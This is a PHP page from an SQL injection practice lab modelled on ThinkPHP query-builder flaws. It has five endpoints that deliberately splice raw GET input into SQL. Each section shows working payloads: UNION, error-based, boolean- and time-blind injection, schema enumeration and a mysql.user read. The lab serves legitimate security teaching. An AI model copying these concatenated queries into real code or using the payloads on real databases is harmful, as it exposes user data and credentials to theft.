<?php
require_once 'config/database.php';

header('Content-Type: text/html; charset=utf-8');

$result = '';
$sql = '';

// 模拟ThinkPHP框架风格的SQL注入漏洞
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action'])) {
    $action = $_GET['action'];
    $pdo = getDbConnection();
    
    switch ($action) {
        case 'where_inject':
            // 漏洞1：where方法注入（ThinkPHP 3.x风格）
            if (isset($_GET['username'])) {
                $username = $_GET['username'];
                // 模拟ThinkPHP的where方法
                $where_condition = "username = '$username'";
                $sql = "SELECT * FROM users WHERE $where_condition";
                
                try {
                    $stmt = $pdo->query($sql);
                    $users = $stmt->fetchAll();
                    $result = "找到 " . count($users) . " 个用户";
                    
                    // 显示用户详情
                    if (count($users) > 0) {
                        $result .= "<div class='mt-3'>";
                        $result .= "<h6>用户列表：</h6>";
                        foreach ($users as $user) {
                            $result .= "<div class='card mb-2'>";
                            $result .= "<div class='card-body p-2'>";
                            $result .= "<strong>" . htmlspecialchars($user['username']) . "</strong>";
                            $result .= "<small class='text-muted ms-2'>ID: " . $user['id'] . " | 邮箱: " . htmlspecialchars($user['email']) . " | 角色: " . $user['role'] . "</small>";
                            $result .= "</div>";
                            $result .= "</div>";
                        }
                        $result .= "</div>";
                    }
                } catch (Exception $e) {
                    $result = "查询错误: " . $e->getMessage();
                }
            }
            break;
            
        case 'field_inject':
            // 漏洞2：field方法注入
            if (isset($_GET['fields'])) {
                $fields = $_GET['fields'];
                // 模拟ThinkPHP的field方法
                $sql = "SELECT $fields FROM users LIMIT 1";
                
                try {
                    $stmt = $pdo->query($sql);
                    $user = $stmt->fetch();
                    if ($user) {
                        $result = "查询成功，获取字段: " . implode(', ', array_keys($user));
                    } else {
                        $result = "查询失败";
                    }
                } catch (Exception $e) {
                    $result = "查询错误: " . $e->getMessage();
                }
            }
            break;
            
        case 'order_inject':
            // 漏洞3：order方法注入
            if (isset($_GET['order'])) {
                $order = $_GET['order'];
                // 模拟ThinkPHP的order方法
                $sql = "SELECT * FROM users ORDER BY $order";
                
                try {
                    $stmt = $pdo->query($sql);
                    $users = $stmt->fetchAll();
                    $result = "查询成功，按 $order 排序，共 " . count($users) . " 个用户";
                } catch (Exception $e) {
                    $result = "查询错误: " . $e->getMessage();
                }
            }
            break;
            
        case 'table_inject':
            // 漏洞4：table方法注入
            if (isset($_GET['table'])) {
                $table = $_GET['table'];
                // 模拟ThinkPHP的table方法
                $sql = "SELECT * FROM $table LIMIT 5";
                
                try {
                    $stmt = $pdo->query($sql);
                    $data = $stmt->fetchAll();
                    $result = "从表 $table 查询到 " . count($data) . " 条记录";
                } catch (Exception $e) {
                    $result = "查询错误: " . $e->getMessage();
                }
            }
            break;
            
        case 'find_inject':
            // 漏洞5：find方法注入（ThinkPHP 5.x风格）
            if (isset($_GET['id'])) {
                $id = $_GET['id'];
                // 模拟ThinkPHP的find方法
                $sql = "SELECT * FROM users WHERE id = $id";
                
                try {
                    $stmt = $pdo->query($sql);
                    $user = $stmt->fetch();
                    if ($user) {
                        $result = "找到用户: " . htmlspecialchars($user['username']);
                    } else {
                        $result = "用户不存在";
                    }
                } catch (Exception $e) {
                    $result = "查询错误: " . $e->getMessage();
                }
            }
            break;
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ThinkPHP框架SQL注入靶场</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .vulnerability-section {
            background: white;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-left: 4px solid #dc3545;
        }
        .code-block {
            background: #f8f9fa;
            border-left: 4px solid #007bff;
            padding: 15px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }
        .payload-example {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 10px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
        }
        .thinkphp-badge {
            background: #dc3545;
            color: white;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 0.8em;
            margin-left: 10px;
        }
    </style>
</head>
<body>
    <div class="container mt-4">
        <h1>ThinkPHP框架SQL注入靶场 <span class="thinkphp-badge">ThinkPHP</span></h1>
        <p class="lead">模拟ThinkPHP框架中的SQL注入漏洞</p>
        
        <div class="alert alert-warning">
            <strong>注意：</strong> 此页面包含故意设计的SQL注入漏洞，模拟ThinkPHP框架的安全问题，仅供学习使用。
        </div>
        
        <?php if ($result): ?>
        <div class="alert alert-info">
            <strong>执行结果：</strong> <?php echo $result; ?>
            <?php if ($sql): ?>
                <div class="mt-2">
                    <strong>执行的SQL：</strong>
                    <code><?php echo htmlspecialchars($sql); ?></code>
                </div>
            <?php endif; ?>
        </div>
        <?php endif; ?>
        
        <!-- 漏洞1：where方法注入 -->
        <div class="vulnerability-section">
            <h3>漏洞1：where方法注入 <span class="thinkphp-badge">ThinkPHP 3.x</span></h3>
            <p>ThinkPHP 3.x版本中where方法存在SQL注入漏洞，用户输入直接拼接到where条件中。</p>
            
            <div class="code-block">
// 漏洞代码示例（ThinkPHP 3.x风格）
$username = I('get.username');
$where_condition = "username = '$username'";
$User->where($where_condition)->select();
            </div>
            
            <form method="GET" class="mb-3">
                <input type="hidden" name="action" value="where_inject">
                <div class="input-group">
                    <input type="text" name="username" class="form-control" placeholder="输入用户名" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>">
                    <button type="submit" class="btn btn-primary">查询</button>
                </div>
            </form>
            
            <div class="payload-example">
                <strong>Payload示例：</strong><br>
                • 正常查询: admin<br>
                • 联合查询: admin' UNION SELECT 1,2,3,4,5,6 -- <br>
                • 报错注入: admin' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e)) -- 
            </div>
        </div>
        
        <!-- 漏洞2：field方法注入 -->
        <div class="vulnerability-section">
            <h3>漏洞2：field方法注入 <span class="thinkphp-badge">ThinkPHP 5.x</span></h3>
            <p>field方法中用户输入直接拼接到SELECT字段中，导致SQL注入。</p>
            
            <div class="code-block">
// 漏洞代码示例（ThinkPHP 5.x风格）
$fields = input('get.fields');
Db::name('users')->field($fields)->find();
            </div>
            
            <form method="GET" class="mb-3">
                <input type="hidden" name="action" value="field_inject">
                <div class="input-group">
                    <input type="text" name="fields" class="form-control" placeholder="输入查询字段" value="<?php echo isset($_GET['fields']) ? htmlspecialchars($_GET['fields']) : ''; ?>">
                    <button type="submit" class="btn btn-primary">查询</button>
                </div>
            </form>
            
            <div class="payload-example">
                <strong>Payload示例：</strong><br>
                • 正常查询: username,email<br>
                • 联合查询: username,email FROM users UNION SELECT 1,2,3,4,5,6 -- <br>
                • 子查询: (SELECT group_concat(table_name) FROM information_schema.tables)
            </div>
        </div>
        
        <!-- 漏洞3：order方法注入 -->
        <div class="vulnerability-section">
            <h3>漏洞3：order方法注入 <span class="thinkphp-badge">ThinkPHP 5.x</span></h3>
            <p>order方法中用户输入直接拼接到ORDER BY子句中，导致SQL注入。</p>
            
            <div class="code-block">
// 漏洞代码示例（ThinkPHP 5.x风格）
$order = input('get.order');
Db::name('users')->order($order)->select();
            </div>
            
            <form method="GET" class="mb-3">
                <input type="hidden" name="action" value="order_inject">
                <div class="input-group">
                    <input type="text" name="order" class="form-control" placeholder="输入排序字段" value="<?php echo isset($_GET['order']) ? htmlspecialchars($_GET['order']) : ''; ?>">
                    <button type="submit" class="btn btn-primary">排序</button>
                </div>
            </form>
            
            <div class="payload-example">
                <strong>Payload示例：</strong><br>
                • 正常排序: id DESC<br>
                • 联合查询: id,(SELECT 1 FROM (SELECT sleep(3))a)<br>
                • 报错注入: updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
            </div>
        </div>
        
        <!-- 漏洞4：table方法注入 -->
        <div class="vulnerability-section">
            <h3>漏洞4：table方法注入 <span class="thinkphp-badge">ThinkPHP 3.x/5.x</span></h3>
            <p>table方法中用户输入直接拼接到表名中，导致SQL注入。</p>
            
            <div class="code-block">
// 漏洞代码示例
$table = input('get.table');
Db::name('')->table($table)->select();
            </div>
            
            <form method="GET" class="mb-3">
                <input type="hidden" name="action" value="table_inject">
                <div class="input-group">
                    <input type="text" name="table" class="form-control" placeholder="输入表名" value="<?php echo isset($_GET['table']) ? htmlspecialchars($_GET['table']) : ''; ?>">
                    <button type="submit" class="btn btn-primary">查询</button>
                </div>
            </form>
            
            <div class="payload-example">
                <strong>Payload示例：</strong><br>
                • 正常查询: users<br>
                • 联合查询: users UNION SELECT 1,2,3,4,5,6 -- <br>
                • 跨库查询: mysql.user
            </div>
        </div>
        
        <!-- 漏洞5：find方法注入 -->
        <div class="vulnerability-section">
            <h3>漏洞5：find方法注入 <span class="thinkphp-badge">ThinkPHP 5.x</span></h3>
            <p>find方法中用户输入直接拼接到WHERE条件中，导致数字型SQL注入。</p>
            
            <div class="code-block">
// 漏洞代码示例（ThinkPHP 5.x风格）
$id = input('get.id');
Db::name('users')->find($id);
            </div>
            
            <form method="GET" class="mb-3">
                <input type="hidden" name="action" value="find_inject">
                <div class="input-group">
                    <input type="text" name="id" class="form-control" placeholder="输入用户ID" value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>">
                    <button type="submit" class="btn btn-primary">查找</button>
                </div>
            </form>
            
            <div class="payload-example">
                <strong>Payload示例：</strong><br>
                • 正常查询: 1<br>
                • 联合查询: 1 UNION SELECT 1,2,3,4,5,6<br>
                • 布尔盲注: 1 AND (SELECT COUNT(*) FROM users) > 0<br>
                • 时间盲注: 1 AND IF(ASCII(SUBSTR((SELECT user()),1,1))=114,sleep(3),0)
            </div>
        </div>
        
        <div class="mt-4">
            <a href="index.php" class="btn btn-secondary">返回首页</a>
        </div>
    </div>
</body>
</html>